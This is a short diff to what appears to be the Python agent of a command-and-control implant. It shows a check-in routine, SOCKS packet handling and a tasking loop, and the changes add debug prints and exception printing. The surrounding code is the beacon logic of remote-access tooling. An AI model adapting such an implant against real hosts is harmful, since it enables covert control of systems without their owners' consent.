@@ -113,6 +113,7 @@ CRYPTO_HERE
             for packet in tasking_data["socks"]: self.socks_in.put(packet)
 
     def checkIn(self):
+        print('checkIn......')
         hostname = socket.gethostname()
         ip = ''
         if hostname and len(hostname) > 0:
@@ -219,6 +220,7 @@ CRYPTO_HERE
         }
 
         while(True):
+            print('working......')
             if(self.agent_config["UUID"] == ""):
                 self.checkIn()
                 self.agentSleep()
@@ -230,7 +232,8 @@ CRYPTO_HERE
                         self.getTaskings()
                         self.processTaskings()
                         self.postResponses()
-                    except: pass
+                    except Exception as e:
+                        print(e)
                     self.agentSleep()                   
 
 if __name__ == "__main__":
